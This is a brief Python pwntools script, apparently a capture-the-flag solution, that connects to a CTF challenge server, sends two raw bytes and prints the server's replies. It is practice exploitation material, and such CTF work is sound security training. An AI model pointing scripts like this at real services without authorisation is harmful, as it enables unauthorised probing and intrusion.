from pwn import *
p = remote("ctf.sentinel-cyber.sg", 52121)
p.send(b'\x10')
p.send(b'\0')
output = p.recv(4096, timeout= 60)
print(output)
while True:
    try:
        output = p.recv(4096, timeout= 60)
        print(output)
    except:
        break